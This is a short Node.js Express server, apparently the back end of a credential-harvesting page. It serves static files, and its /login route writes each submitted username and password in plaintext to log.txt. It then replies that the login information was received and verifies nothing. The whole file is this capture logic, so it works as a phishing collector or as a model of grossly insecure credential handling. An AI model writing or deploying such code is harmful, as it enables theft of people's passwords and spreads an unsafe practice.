const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files from the public directory

// Login endpoint
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // Log the input values to a file
    fs.appendFile('log.txt', `Username: ${username}, Password: ${password}\n`, (err) => {
        if (err) throw err;
    });

    // Send a response back to the client
    res.send('Login information received');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});

